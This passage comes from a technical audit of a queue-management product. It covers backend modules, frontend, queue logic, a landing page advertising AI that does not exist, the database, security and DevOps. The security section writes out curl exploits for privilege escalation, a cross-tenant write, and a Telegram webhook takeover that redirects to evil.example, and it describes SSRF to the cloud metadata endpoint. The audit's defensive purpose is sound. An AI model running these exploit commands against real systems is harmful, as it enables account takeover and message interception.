- All event listeners are `@Async @EventListener` — **NOT `@TransactionalEventListener(AFTER_COMMIT)`.** If the source DB transaction rolls back, the WebSocket message has already flown. Clients see ghost tickets.
- `TicketNoShow` payload uses `e.windowId().toString()` — **NPE if `windowId` is null.** Possible from a manual cancel path that publishes NoShow without a window context. Bug.
- Operator/customer/signage broadcasts are explicit per-topic. Good separation if you fix the subscription auth.

### 3.1.9 `:module-adapter`

**Adapters:** 4 implementations (Generic HTTP, Innomax, WebKiosk, WebSignage). `WebKioskAdapter`/`WebSignageAdapter` are no-ops (frontend handles those). `GenericHttpAdapter` POSTs to a device-configured URL.

**`GenericHttpAdapter.java`** (88 LOC) — SSRF risk.
- `baseUrl` comes from the device config, which an admin user sets. If an attacker compromises an admin account, they can configure a "device" with `baseUrl = http://169.254.169.254/latest/meta-data` to read AWS IMDS credentials, or `http://internal-admin-api:8080` for SSRF. No URL allowlist.

**`DeviceController.java`** (102 LOC).
- **`@RequestMapping("/api/v1/devices")` — DOUBLE PREFIX.** Server has `server.servlet.context-path: /api`, so the real path is `/api/api/v1/devices`. Other controllers use `/v1/...`. Either this is a bug (most likely) or you've gone out of your way to expose this on a different path. The `SecurityConfig` `permitAll` for `/v1/devices/*/webhook` won't match `/api/v1/devices/*/webhook` after the context-path prefix is applied. **Currently this controller is broken or only reachable via the wrong path.**
- `register` is open — anyone can register a device under any branch. Returns a token. Free device registration → unauthenticated kiosk-style ticket creation.
- `heartbeat` calls `authenticate` then `heartbeat` — two queries when one would do.
- `webhook` calls `take_ticket` with `null` customerId. The branch is taken from the device's `branchId`. OK, but with free registration, anyone can spam tickets.

**`SyncOrchestrator.java`** — handles `TicketCreated`/`TicketCalled`. Doesn't handle `TicketServed`, `TicketCancelled`, `TicketNoShow`, `TicketExpired`. Devices may show stale "now serving" forever.

## 3.2 Cross-cutting backend concerns

| Concern                | State                                                                                                       |
| ---------------------- | ----------------------------------------------------------------------------------------------------------- |
| Transaction management | Mostly correct (`@Transactional` on services). Event listeners should use `@TransactionalEventListener`.    |
| Caching                | `spring.cache.type=redis` configured, but **zero `@Cacheable` annotations in the codebase.** Dead config.   |
| Message queue          | `spring.rabbitmq` configured, **zero `@RabbitListener` or `RabbitTemplate` usage.** Pure overhead.          |
| Pagination             | None. `/v1/branches` returns all, `/v1/tickets` returns all, audit log limited to 100 by query param only.  |
| Validation             | `@Valid` on most controllers; missing on PUT /operating-hours, MeController PATCH, AdminUserController.     |
| Logging                | `@Slf4j` everywhere; prod uses JSON-format pattern but no MDC propagation, no correlation ID injected.      |
| Tracing                | No OpenTelemetry/Zipkin/Sleuth. Just micrometer-prometheus.                                                 |
| Async executor         | `@EnableAsync` with default `SimpleAsyncTaskExecutor` — unbounded, no thread name prefix.                   |
| Virtual threads        | Enabled. Combined with `InheritableThreadLocal` in `TenantContext` — risky (see §3.1.2).                    |

---

# 4. Frontend Audit

## 4.1 The big picture

| Metric                     | Value                                                              |
| -------------------------- | ------------------------------------------------------------------ |
| Framework                  | Next.js 15.1, App Router, React 19, TypeScript 5.7                |
| State                      | Zustand (auth + ui), no react-query for server state              |
| Realtime                   | `@stomp/stompjs` 7.0 over SockJS                                  |
| Styling                    | **Inline styles 100%**. No Tailwind utility classes in actual JSX even though Tailwind v4 is in devDeps. CSS variables for theming. |
| i18n                       | `next-intl` 3.26 configured + 41-line JSON files in 3 locales — **never used** (zero `useTranslations` calls). |
| Total LOC                  | 9,337 across 31 .tsx files                                        |
| Largest file               | `admin/branches/page.tsx` at 897 LOC                              |
| Landing page               | 806-LOC single file with hardcoded "fake" testimonials, fake stats, fake compliance claims. |

## 4.2 Architectural problems

1. **Inline-style avalanche.** Every page is a 300-900 LOC component with hundreds of `style={{ ... }}` objects. New object identity on every render, defeats React reconciliation, no shared design system. The `packages/ui/src/primitives/` files (Btn, LiveDot, Skeleton, Tag) exist but are **not imported by the web app**. Pure dead weight.

2. **No design system.** The "primitives" in `packages/ui` are trivial wrappers (e.g., Btn.tsx). The actual styling system is "copy the inline styles to the next file." Sparkline, Tag, Section labels, etc. are reinvented in every file.

3. **No react-query.** Each page hand-rolls `useEffect → fetch → useState → setInterval → cleanup`. No caching, no SWR, no deduplication. Branch page hits `/v1/branches` + `/v1/tickets/my` on mount AND every 30 s.

4. **Polling on top of WebSocket.** `admin/queue/page.tsx` does both WS subscription AND `setInterval(loadTickets, 15_000)`. If both fire, two simultaneous loads, last-write-wins. The WS path doesn't carry the new tickets payload — it just triggers a re-fetch (so the WS is essentially a notification bell).

5. **localStorage stores access + refresh tokens.** `stores/auth.ts` uses `persist()` from Zustand, which writes to localStorage by default. **An XSS payload can steal both tokens trivially.** Refresh should be httpOnly cookie only (backend already sets one for `/v1/auth` — but the client also stores it in JSON). Reduce surface: keep accessToken in memory (sessionStorage at most), trust the cookie for refresh.

6. **No CSP, no SRI, no security headers.** `next.config.mjs` has no `headers()` block. `nginx/zeyvo.conf` doesn't set CSP, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, etc. The site is a clickjack-friendly target.

7. **`@telegram-apps/sdk-react` is in dependencies but never imported.** Dead dep.

## 4.3 Per-route observations

### `/` (landing)
- 806 LOC. Hero claims "AI predictions live in Tashkent", stat ticker says "2.4M tickets/month, 142 enterprise customers, 38% wait cut." **Pure marketing fiction in a codebase that has never seen real traffic.** Plus fake testimonials with named individuals at "Asaka Bank" etc.
- Enterprise section claims SOC 2 Type II, ISO 27001, single-tenant deployments, multi-region (UZ/KZ/EU/US) data residency. **None of this is real.** Showing this to a regulated buyer is a perjury risk.
- 6 hardcoded "feature flags" UI in `/platform/flags` is local React state — no persistence.

### `/branches`, `/branch/[id]`, `/ticket/[id]`
- Sensible flows. Polling every 20-30 s + WS. Reasonable for MVP.
- `branchCapacity` is sent to backend in `TakeTicketRequest` body but **the backend DTO doesn't define this field**. Silently dropped (Jackson `fail-on-unknown-properties: false` swallows it). Dead client data.
- `branch/[id]` calls `apiFetch<{...}>("/api/v1/tickets", { method: "POST" })` — the response shape `{ id; number }` is narrower than the actual `TicketDto`. Will break if TicketDto changes.

### `/kiosk/[branchId]`, `/signage/[branchId]`
- Kiosk uses `window.open` to print receipts. No WebUSB. The `kiosk_webusb_print` feature flag promises this, but it's never implemented.
- Signage plays AudioContext chime on new tickets. Cute. But the AudioContext is created and `close()`d on every event — `AudioContext` instances are heavyweight. Re-create suspended one once.

### `/admin/...`
- Sidebar guards by `roles` array from Zustand. **Client-side only.** Backend doesn't enforce. Anyone with a customer JWT can curl `/v1/admin/users` and get the full user list.
- Admin layout polls `/v1/me` on mount but doesn't react to 401 — if logged out mid-session, the page hangs.
- `admin/queue/page.tsx` calls `loadBranches` which does `branches.map(b => GET /v1/branches/{id})` — N+1, network-side. For a tenant with 50 branches that's 50 sequential fetches on every page mount.

### `/platform/...` (super-admin)
- Layout checks `roles.includes("super_admin")` — client-side only.
- Hardcoded "System status" claims everything is "operational" — never actually probes anything.
- Feature flags page = local state, no persistence, no backend wiring.

### `/tg/...` (Telegram Mini App)
- Files exist; uses different layout. Auth flow assumes Telegram WebApp initData. Tied tightly to `authenticateViaTelegram` (broken auth_date check, see §3.1.3).

## 4.4 Performance / accessibility

- **Hydration:** `RootLayout` hardcodes `lang="uz"`. If a user has English locale, the `<html lang>` says Uzbek. Bad for screen readers.
- **Accessibility:** Many "buttons" are `<div onClick=...>`. No `role`, no `aria-label`, no keyboard handling. The QR modal traps focus naturally via z-index but no `aria-modal`. Failed AXE audit by default.
- **Bundle size:** `framer-motion`, `recharts`, `lucide-react`, `qrcode`, full `@radix-ui` set, `sockjs-client` — all imported eagerly. No dynamic imports.
- **Re-render risk:** Every page is a single function component holding all its state. Children receive props by value (object identity changes per render). No `useMemo`/`React.memo` anywhere I saw.

---

# 5. Queue Engine Logic Audit

This is the heart of the product. Below is a state-machine map followed by edge-case analysis.

## 5.1 Ticket lifecycle (intended)

```
            ┌──────────┐
   take ──▶ │ waiting  │
            └────┬─────┘
                 │ callNext
                 ▼
            ┌──────────┐
   serve──▶ │  called  │ ◀── operator clicks "Call next" again → previous CALLED becomes no_show
            └─┬───┬────┘
              │   │ (no startServing endpoint anywhere — see §5.4 below)
       serve  │   │ noShow / timeout
              ▼   ▼
        ┌────────┐  ┌──────────┐
        │ served │  │ no_show  │
        └────────┘  └──────────┘

        cancel: from waiting/called → cancelled
        expire: from waiting (older than expiry-minutes) → expired
        transfer: from waiting/called → waiting (with new window_id + +5 priority)
```

## 5.2 Concurrency primitives — verified

- `generateTicketNumber`: ✅ atomic via `ON CONFLICT DO UPDATE RETURNING`.
- `callNext`: ✅ `SELECT FOR UPDATE SKIP LOCKED LIMIT 1`. Two operators can't grab the same ticket.
- Capacity check: ❌ TOCTOU race (read-then-write without lock).
- Active-ticket-per-customer check: ❌ same TOCTOU.
- Idempotency: ✅ `ticket.idempotency_key UNIQUE` column in V1. **But the column is never written by the service.** The DB constraint exists; the application doesn't use it. Dead defense.

## 5.3 Race conditions and timing flaws

1. **Two operators on same window simultaneously click "Call next."** Window's currently-serving ticket is `T1` (CALLED). Both calls enter `closeCurrentlyServingOnWindow`, both find `T1`, both call `t.markNoShow(now)`. JPA dirty-checking issues two UPDATE statements; whichever commits last wins. Both then `findFirst...waiting...` and grab `T2` and `T3`. Window now claims to be serving the loser. Recovery is lossy.

2. **Operator clicks "Call next" while customer is mid-confirm-presence.** `confirmPresence` resets `called_at`. `callNext` runs concurrently and marks the same ticket `no_show`. Inconsistent end state depending on commit order.

3. **No-show scheduler ticks while operator marks `served`.** Scheduler picks ticket T1 from `findExpiredCalled`. Operator's HTTP call also marks T1 as `served`. Whichever transaction commits first wins. The other's UPDATE affects 0 rows but raises no error — service silently lies about success.

4. **`pollUpdates` (Telegram bot polling) + webhook receiving the same update.** If both are configured (which is the default), bot commands fire twice. `/cancel` cancels twice (idempotent), but `/status` sends two messages.

5. **WebSocket broadcast before commit.** `@EventListener` (not transactional) fires sync before the transaction commits. If commit fails, clients see a ticket that doesn't exist on refresh.

6. **`nudgedTickets` race.** Two scheduler ticks can both observe the set doesn't contain `T1` and both `add()`. `ConcurrentHashMap.newKeySet().add()` is atomic — fine. But across two JVM instances, both add to their independent sets, both fire the nudge.

7. **`/v1/dev/seed` race.** Two concurrent seed calls can both miss the existence check and both try to create the Asaka branch. Unique constraint on `(organization_id, slug)` blocks the second one, but the error is wrapped as an opaque 500.

## 5.4 Impossible states

- **`startServing()` exists on `Ticket` but is never called.** No endpoint moves a ticket from CALLED → SERVING. The audit / analytics queries use `WHERE status = 'serving'` (e.g., `findActiveByBranch`), so the SERVING state is unreachable in the running app yet still queried. Either delete the state or wire `confirmPresence` to move CALLED → SERVING.
- **TRANSFERRED status exists in the DB CHECK constraint and the `TicketStatus` enum but is never set anywhere.** Dead state.
- **`window_desk.serving_ticket` can hold a stale value** if the no-show scheduler clears it but then a `closeCurrentlyServingOnWindow` later sets it again from a delayed operation. Today both run inside the same transaction so this is OK, but the path is fragile.

## 5.5 Fairness / queue policy

- The active queue is FIFO by `joined_at` within priority. Priority is only changed by transfer (+5). No service-tier balancing (the landing page promises "FIFO or hybrid bands" — not implemented).
- Walk-in vs remote tickets share one number sequence per `(branch_id, service_code)`. Fine for MVP.
- No backpressure for hot branches: if all 5 windows are full, the 100th remote ticket joins the queue at #100, no estimated wait shown beyond the heuristic.

## 5.6 Cancellation / expiration

- `cancel(ticketId, null)` is the admin path — bypasses owner check. Used by the Telegram webhook with no authentication on the webhook → anyone with a guessed URL can cancel any ticket.
- `expireStaleTickets` updates status to EXPIRED **but does not set `closed_at`**. Inconsistent (other terminal transitions set closed_at).
- `expireStaleTickets` doesn't clear `window_desk.serving_ticket` even though an expired ticket could in theory have been WAITING but assigned to a window (transferred). Leak.

## 5.7 Overload / abuse scenarios

- **Anonymous ticket spam.** `POST /v1/tickets` is `permitAll`. With rate-limit disabled in dev/local, one curl loop floods a branch to capacity. With rate-limit enabled in prod, 10 tickets per 5 min per IP. Behind a corporate NAT, 100 employees share one IP — they collectively get 10 tickets per 5 min. Way too aggressive in some cases, way too lax in others.
- **No CAPTCHA, no proof-of-work.** Automated kiosk-source registration possible (`POST /api/v1/devices/register` is open — anyone can register a "device" then it can take kiosk-source tickets unlimited).
- **Telegram bot DOS.** `pollUpdates` runs every 4 s. If Telegram returns 5000 updates after a long downtime, the loop reads them all in one synchronous pass — blocks for seconds at a time.

---

# 6. AI & Prediction System Audit

## 6.1 The advertised AI

From the landing page (`apps/web/app/(app)/page.tsx`):
- "AI wait-time predictions, live in Tashkent"
- "ETA models trained on the last 90 days of your traffic"
- "Median absolute error is under 90 seconds after two weeks of training data per branch"
- "AI suggests opening Window 7 — peak hits at 13:40, +18% arrivals expected"
- Pricing tier called "Predictions" advertised on `/admin/predict`

## 6.2 The actual AI

`HeuristicEtaEstimator.java` — 18 lines total:
```java
public int estimateMinutes(int ticketsAhead, double avgServiceMinutes, int openWindows) {
    if (ticketsAhead <= 0) return 0;
    int windows = Math.max(1, openWindows);
    return (int) Math.max(0, Math.round((ticketsAhead * avgServiceMinutes) / windows));
}
```

That's it. There is **no model**, **no training pipeline**, **no historical data ingestion**, **no Python sidecar**, **no Spring AI ChatClient usage** despite `spring-ai-bom` being in the BOM. `grep -r "ChatClient\|EmbeddingClient\|predict\|forecast" backend` returns the heuristic only.

## 6.3 Data plumbing for future AI

- `analytics.ticket_event` hypertable is created in V1 but **never written to**. No event publisher copies tickets into it. There is no data to train on.
- TimescaleDB extension is installed in the postgres container but the hypertable isn't activated (the comment in `01_extensions.sql` says it'll be done in an `ApplicationReadyEvent` listener — that listener doesn't exist either).

## 6.4 What this means for the audit

- The "AI" claim on the landing page is **vapor**. Not "weak" — non-existent.
- The product can be **honest** about Phase 1 (heuristic) and ship — the heuristic actually works for low-volume branches. Just stop calling it AI.
- Building real ETA prediction is non-trivial: would need (1) ticket-event ingestion → hypertable, (2) feature engineering (hour-of-day, day-of-week, service mix, weather…), (3) a model — could be LightGBM regressor or even a calibrated Bayesian smoother on top of the heuristic, (4) shadow-deploy + measure MAE before user-facing rollout.
- **Recommendation:** delete the marketing claim. Replace with "Smart ETA estimates that improve as your branch builds history." Then earn the AI label later.

## 6.5 Should there be AI at all?

For an MVP serving Uzbek banks/clinics, **no**. A well-calibrated heuristic (per `(branch, service, hour, weekday)` historical median wait time) will outperform a neural model that hasn't seen 90 days of data. Rule-based ETA + clear UX (showing actual queue depth, not a fake confidence indicator) is the right call until volume justifies the investment.

---

# 7. Database Audit

## 7.1 Schema snapshot

**Schemas:** `app` (OLTP) + `analytics` (TimescaleDB hypertable, dead).
**Migrations:**
- V1 baseline — 12 tables, 13 partial indexes, deferred FK trick for `window_desk.serving_ticket` ↔ `ticket.id`. Solid.
- V2 — drops `(branch_id, code)` unique on `service`. Correct (multiple services share a code prefix).
- V3 — adds `rating_stars`, `rating_comment` to `ticket`.

## 7.2 What's good

| Aspect             | Verdict                                                                                 |
| ------------------ | --------------------------------------------------------------------------------------- |
| UUIDs              | `gen_random_uuid()` via pgcrypto. Good.                                                 |
| Partial indexes    | `WHERE status IN (...)`, `WHERE active`, etc. — the hot-path tickets index is optimal.  |
| Check constraints  | Enum-like fields use TEXT + CHECK (plan, role, status, source). Avoids PG enum hassle.  |
| Foreign keys       | All FKs declared. ON DELETE behavior is explicit (SET NULL or CASCADE).                |
| JSONB              | Used for `settings`, `metadata`, `data`. Appropriate.                                   |
| Idempotency key    | `ticket.idempotency_key UNIQUE` — exists, but service doesn't use it (waste).           |

## 7.3 What's wrong

1. **Missing index on `app.session.user_id` for revoke-all-by-user.** The partial index covers `(user_id, expires_at)` — useful for active sessions, not for `revoke_all_for_user` queries.
2. **Missing index on `app.audit_event(actor_user_id, occurred_at)`** — would speed up "show this user's history."
3. **`telegram_id` on user_account is `bigint UNIQUE`.** Telegram IDs fit in `bigint`. OK.
4. **`ticket.metadata jsonb`** is set to `{}` default — write path uses `Map.of()` which Jackson serializes correctly, but no GIN index on metadata. If anyone ever queries by metadata.key, full scan.
5. **`window_desk.service_codes char(1)[]`** — needs GIN index for `service_codes @> array['A']` queries. None defined. None used today.
6. **`organization.settings jsonb`** — same. Lots of potential for plan-gated features later; no JSONB indexing strategy.
7. **`analytics.ticket_event`** — declared, never written, hypertable command commented out. Dead schema.
8. **No `created_at`/`updated_at` on `service`, `window_desk`, `operating_hours`.** Auditing breaks.
9. **No tombstone strategy for tenant deletion.** `organization.deleted_at` exists but no cascade to soft-delete branches/users.
10. **`ticket.rating_stars` is NULLABLE and unindexed.** Analytics queries `WHERE rating_stars IS NOT NULL` — no partial index.

## 7.4 Query patterns

- **N+1 in TenantService.listBranches.** Per-row subqueries for active_tickets, open_windows, avg_service_s. PostgreSQL can decorrelate some but lateral joins or aggregated CTEs are cleaner.
- **Repeated COUNT subqueries in `WHERE`** in TicketLifecycleScheduler.checkNearTurn. Should use `COUNT() OVER (PARTITION BY branch_id ORDER BY joined_at)`.
- **TicketController.get(id)** runs 4-5 separate queries; should be one LEFT JOIN.
- **AnalyticsController** queries are reasonable for low-volume but not bounded — no LIMIT.

## 7.5 Concurrency / locking

- `SELECT FOR UPDATE SKIP LOCKED` in `callNext` — good.
- Deferred FK (`window_desk.serving_ticket → ticket(id) DEFERRABLE INITIALLY DEFERRED`) — clever to avoid chicken-and-egg, but never written to in a deferred way (the FK isn't actually exercised that way).
- No row-level locking elsewhere — capacity check, transfer, etc. all rely on TOCTOU.
- Connection pool: Hikari 30 in prod, 20 dev. Reasonable.

## 7.6 Scaling strategy

- Single PG instance, 512 MB memory limit in prod. **Will die at low scale.** For a real launch, switch to managed PG (DigitalOcean DB / RDS), 4–8 GB, with logical replicas for analytics.
- No read replica routing. Analytics queries hit primary.
- No partitioning. `app.ticket` becomes the hot table; consider monthly partitioning when it crosses 50M rows.
- TimescaleDB is shipped but unused.

---

# 8. Security Audit

## 8.1 Severity table

| Sev   | Issue                                                                                                                   | Where                                                       | Exploit difficulty |
| ----- | ----------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- | ------------------ |
| **CRIT**  | Telegram bot token committed to repo as default value                                                              | `application.yml:104`                                       | Already exploited if pushed to public repo |
| **CRIT**  | Zero `@PreAuthorize` — any authenticated user can grant themselves `org_admin`                                    | `AdminUserController`                                       | curl one-liner    |
| **CRIT**  | `resolveOrgId()` bug → all org writes go to first organization                                                     | `BranchController:148`                                      | Default behavior  |
| **CRIT**  | `/v1/dev/seed` exposed in production                                                                              | `BranchController:142` + `SecurityConfig` permissive auth  | curl              |
| **CRIT**  | Webhook secret default-empty → `/v1/integrations/telegram/webhook` is unauthenticated by default                  | `TelegramWebhookController:74`                              | curl              |
| **CRIT**  | `registerWebhook` is `permitAll` → bot takeover                                                                   | `SecurityConfig:43`                                         | curl              |
| **HIGH**  | `POST /v1/tickets` `permitAll` → unauthenticated ticket spam                                                      | `SecurityConfig:51`                                         | curl loop          |
| **HIGH**  | `POST /v1/tickets/*/cancel` `permitAll` + UUID-guessing → grief cancel                                            | `SecurityConfig:52`                                         | If UUID leaks via receipt/SMS |
| **HIGH**  | `GET /v1/tickets/**` `permitAll` → tenant-data leak by UUID                                                       | `SecurityConfig:49`                                         | If UUID leaks      |
| **HIGH**  | STOMP allows `*` origin and has no auth on CONNECT                                                                 | `WebSocketConfig:23`                                        | Browser console     |
| **HIGH**  | Refresh + access tokens in localStorage (Zustand persist)                                                          | `apps/web/stores/auth.ts`                                   | Any XSS            |
| **HIGH**  | Telegram WebApp `auth_date` age not checked                                                                       | `TelegramAuthService.validateAndExtractUser`                | Replay a captured initData |
| **HIGH**  | SSRF via device adapter `base_url`                                                                                | `GenericHttpAdapter`                                        | Admin account compromise |
| **HIGH**  | `POST /api/v1/devices/register` open                                                                              | `DeviceController:33` + `SecurityConfig`                    | curl                |
| **HIGH**  | JWT default secret `dev-secret-change-in-production-32chars` is 32+ chars — passes the length check               | `application.yml:100`                                       | Default deploy      |
| **MED**   | `InheritableThreadLocal` + virtual threads → cross-request tenant leak risk                                       | `TenantContext`                                             | Race condition, hard to reproduce |
| **MED**   | Audit log JSON injection via `detail` string concatenation                                                        | `AuditEventListener.write`                                  | Future code change that puts user input in detail |
| **MED**   | No CSP, no HSTS, no X-Frame-Options headers                                                                       | `nginx/zeyvo.conf` + `next.config.mjs`                      | Clickjack / XSS amplification |
| **MED**   | Rate-limit IP from `X-Forwarded-For` without proxy trust check                                                    | `RateLimitFilter:74`                                        | Header spoof        |
| **MED**   | Rate-limit map grows unbounded (memory exhaustion DoS)                                                            | `RateLimitFilter:33`                                        | Long-running session |
| **MED**   | Telegram webhook secret compared with `equals` (timing leak) not `MessageDigest.isEqual`                          | `TelegramWebhookController:74`                              | Theoretical         |
| **MED**   | `/v1/openapi.json` and `/v1/docs/**` exposed in prod                                                              | `SecurityConfig:45`                                         | Information disclosure |
| **MED**   | Anonymous SockJS connection downgrade — any origin                                                                | `WebSocketConfig`                                           | Cross-site WS connection |
| **LOW**   | OTPs use SecureRandom but only 6 digits — 1M space, brute-forceable in theory                                     | `AuthService:140`                                           | 5-attempt cap saves this |
| **LOW**   | Logout doesn't blacklist access token                                                                             | `AuthController.logout`                                     | 15-min window of exposure |
| **LOW**   | DTO swallows unknown properties (`fail-on-unknown-properties: false`)                                              | `application.yml:61`                                        | Future schema confusion |
| **LOW**   | `actuator/**` `permitAll` (no auth on /actuator/prometheus, /actuator/health detail) — although `show-details: when-authorized` reduces leakage | `SecurityConfig:44`            | Metric leakage      |

## 8.2 Exploit examples

### Exploit 1 — privilege escalation (15 lines of curl)

```bash
# Step 1: phone-login as a normal customer
TOKEN=$(curl -s -X POST 'https://api.zeyvo.app/api/v1/auth/dev-login?phone=+998900000001' \
  | jq -r .accessToken)

# Step 2: grant yourself org_admin
USERID=$(curl -s 'https://api.zeyvo.app/api/v1/admin/users' \
  -H "Authorization: Bearer $TOKEN" | jq -r '.[0].id')

curl -X POST "https://api.zeyvo.app/api/v1/admin/users/$USERID/roles/add?role=org_admin" \
  -H "Authorization: Bearer $TOKEN"

# Step 3: refresh token to pick up new role claim, profit
curl -X POST 'https://api.zeyvo.app/api/v1/auth/refresh' \
  -H "Cookie: zeyvo_refresh=<your-refresh-from-step-1>"
```
**Result:** customer → org_admin → full platform control.

### Exploit 2 — cross-tenant write (no code change required)

Because `BranchController.resolveOrgId()` always returns `getFirstOrgId()`:
```bash
# Even a brand-new tenant's user calls this:
curl -X POST 'https://api.zeyvo.app/api/v1/branches' \
  -H "Authorization: Bearer $TENANT_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Backdoor branch","type":"bank","timezone":"UTC"}'
```
**Result:** new branch created under Tenant A (the oldest org), funded by Tenant B's auth.

### Exploit 3 — bot takeover

```bash
# Set the bot to forward all updates to attacker's server:
curl -X POST 'https://api.zeyvo.app/api/v1/integrations/telegram/register-webhook?url=https://evil.example'
```
No auth required. The bot stops working for users; attacker harvests all messages.

### Exploit 4 — Telegram initData replay

A captured initData string (e.g., from a JS console log, MITM on http, or a logged HTTP request) can be reused to log in as that Telegram user forever, because `auth_date` is signed but never checked for freshness.

## 8.3 Mitigations (recommended)

1. **Add `@PreAuthorize` everywhere.** Minimum: `@PreAuthorize("hasAnyRole('OPERATOR','MANAGER','ORG_ADMIN')")` on admin endpoints, `@PreAuthorize("hasRole('SUPER_ADMIN')")` on `/v1/platform/**`.
2. **Fix `resolveOrgId`.** `auth.getDetails()` is a `Claims`; cast it and read `org_id`. Or pull from `SecurityContextHolder` claims directly.
3. **Remove the bot-token default from `application.yml`.** Rotate the leaked token. Add `application.yml` to `.gitignore` if it ever contained secrets, or audit git history.
4. **Make webhook secret mandatory.** Refuse to start if `TELEGRAM_WEBHOOK_SECRET` is empty in prod profile.
5. **Lock down `/v1/dev/seed`.** Either delete it or guard with `@Profile("local")`.
6. **Move access token out of localStorage.** Keep in-memory only; rely on refresh cookie.
7. **Add `auth_date` age check** in `validateAndExtractUser`.
8. **Add STOMP CONNECT interceptor** that validates the JWT and scopes subscriptions to the user's tenant.
9. **Tighten ticket endpoints.** GET requires ownership (or operator/manager). Cancel requires ownership. Rate requires the ticket-id-to-customer-id check.
10. **Add security headers** in nginx: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.
11. **Validate `base_url` allowlist** in `GenericHttpAdapter` — disallow private CIDR, link-local, 169.254.0.0/16.

---

# 9. DevOps & Infrastructure Audit

## 9.1 Docker

**`Dockerfile.backend`:**
- Multi-stage (jdk → jre Alpine). Good.
- **Duplicate COPY of `module-notification/build.gradle.kts`** (lines 15-16). Harmless but a sign of careless edits.
- Runs as non-root `zeyvo` user. Good.
- `-XX:MaxRAMPercentage=70` — OK for a 1024M container.
- No JVM heap dump on OOM, no `-XX:+ExitOnOutOfMemoryError`, no `-XX:+HeapDumpOnOutOfMemoryError`. Production troubleshooting will be painful.

**`Dockerfile.web`:**
- Multi-stage (deps → builder → runner). Good.
- Uses Next.js standalone output. Right call for Docker.
- Same non-root user pattern.
- **No build-time cache mount** (`--mount=type=cache,target=/app/.next/cache`). Slow rebuilds.

## 9.2 docker-compose

**`docker-compose.yml`** (dev):
- TimescaleDB image. Good (matches the migration's assumption).
- Healthchecks defined for all three. Good.
- Volumes use named volumes. Good.
- `redis-server --maxmemory 256mb --maxmemory-policy allkeys-lru` — sensible defaults.

**`docker-compose.prod.yml`**:
- Has nginx, backend, web, postgres, redis, rabbitmq. Six containers on one droplet.
- **RabbitMQ runs but is unused** (no `@RabbitListener` in the code). 256 MB wasted.
- **Redis runs but isn't directly used** (Spring cache type is redis but no `@Cacheable`; rate limit is in-memory). Some marginal use via Spring's session/cache abstraction maybe, but in practice nothing reads from Redis.
- `depends_on: condition: service_healthy` is correct.
- Memory budget in DEPLOY.md totals 2.7 GB on an 8 GB droplet. Realistic.
- `IMAGE_TAG` env interpolation — fine.
- **No restart policy on web** (`restart: unless-stopped` is set on others; web has it too on inspection — OK).
- **No log driver config.** Default is json-file; will fill the disk on a chatty backend.
- **No resource limits on nginx.**

## 9.3 nginx

`zeyvo.conf`:
- TLS termination, HTTP→HTTPS redirect. Standard.
- `proxy_read_timeout 86400s` for `/api/ws` — required for long-lived WS, OK.
- Rate limit `api_global=60r/m`, `api_auth=10r/m`. Reasonable.
- **No `proxy_buffering off` on WS location** — SockJS XHR-streaming may stall.
- **No CSP / HSTS / security headers.**
- **TLS config:** ssl_protocols TLSv1.2 TLSv1.3 — good. No `ssl_ciphers` directive — relies on OpenSSL default, which is OK on modern nginx.
- **No OCSP stapling.**
- **No gzip on api.zeyvo.app block.**

## 9.4 CI/CD

- DEPLOY.md references `.github/workflows/deploy.yml` but the file is **not present in the repo**. The workflow is hypothetical.
- `deploy.sh` does `ssh root@droplet → docker compose pull → up -d → poll health`. No blue-green, no rolling. 30 s downtime per deploy.
- No GitHub Actions for tests/lint/typecheck visible in the repo.
- Rollback procedure documented but not automated.

## 9.5 Backups

- `backup.sh` does `pg_dumpall | gzip | s3cmd put`. OK.
- Retains 30 days. OK.
- **No verification step** (download + restore test). Backups are unverified; could be silently corrupt.
- **No backup of Redis or RabbitMQ state.** Acceptable since they're not stateful.

## 9.6 Observability

- Micrometer Prometheus is wired (`management.endpoints.web.exposure.include: prometheus`).
- **No custom metrics.** No counters/timers for ticket creation, ETA accuracy, no-show rate, etc.
- **No log aggregation.** Docker default json-file driver; no Loki/CloudWatch/Datadog setup.
- **No tracing.** No OTel collector, no Jaeger.
- **No alerting.** No Alertmanager rules.
- Healthcheck is a flat `{"status":"ok"}` — doesn't probe DB or Redis.

## 9.7 Secrets management

- `.env` file on the droplet contains all secrets. No Vault, no Docker Secrets, no Kubernetes secrets.
- DEPLOY.md says "stronger random string." No enforcement of secret rotation.
- Bot token leaked in `application.yml` default.

---

# 10. Startup Readiness Audit

## 10.1 What is appropriate for the stage?

Single tenant, 1–3 branches, < 1000 daily tickets, MVP looking for product-market fit. **For that scale, this codebase has built too much.**

| Overbuilt for MVP                                  | Right-sized                              | Underbuilt              |
| -------------------------------------------------- | ---------------------------------------- | ----------------------- |
| RabbitMQ (unused)                                  | PostgreSQL                               | Tests                   |
| Redis (unused)                                     | Spring Boot + JPA                        | Authorization (none)    |
| Modular monolith with 8 modules                    | Flyway migrations                        | Tenant scoping (none)   |
| TimescaleDB (analytics table never written)        | Docker compose                           | Operational metrics     |
| Hardware adapter framework (4 impls, 1 functional) | Telegram bot                             | Error budgets / SLOs    |
| Custom theme system in CSS variables               | Heuristic ETA                            | Real i18n usage         |
| Super-admin "platform" UI                          | nginx TLS termination                    | RBAC enforcement        |
| Spring AI BOM (no usage)                           | Standalone Next.js Docker image          | Logging structure       |
| `common-domain` empty module                       | DEPLOY.md runbook                        | Customer-facing docs    |

## 10.2 Where you'll bleed time

- **Adding any feature requires inline-style copy-paste.** Migrating to a real component system is a 2-week rewrite of the frontend.
- **Every bug fix in auth/JWT touches multiple files** (TelegramBotService vs TelegramWebhookController, AuthService vs MeController, etc.) because logic is duplicated.
- **Security retrofits will be invasive.** Adding `@PreAuthorize` properly means designing a real RBAC model (org → branch → role) and porting every controller.
- **The "Predictions" page already promises features you must build or remove.** Sales will keep selling them.

## 10.3 What should be cut

1. RabbitMQ — remove the dep + container.
2. Redis — remove the dep + container until you actually use it for rate limit or session.
3. `module-analytics` as a module — fold into `:app`.
4. `common-domain` — delete.
5. `module-adapter` `InnomaxHttpAdapter` and `WebKioskAdapter` if not integrated with real hardware yet.
6. The whole `/admin/predict` page — replace with "Heuristic ETA — improving as data accumulates."
7. The `/platform/flags` page — local-state-only is misleading; either build it or hide it.
8. SOC 2 / ISO 27001 claims from the landing page.

## 10.4 What should be postponed

- Real ML/AI predictions (Phase 2/3 according to the flags page).
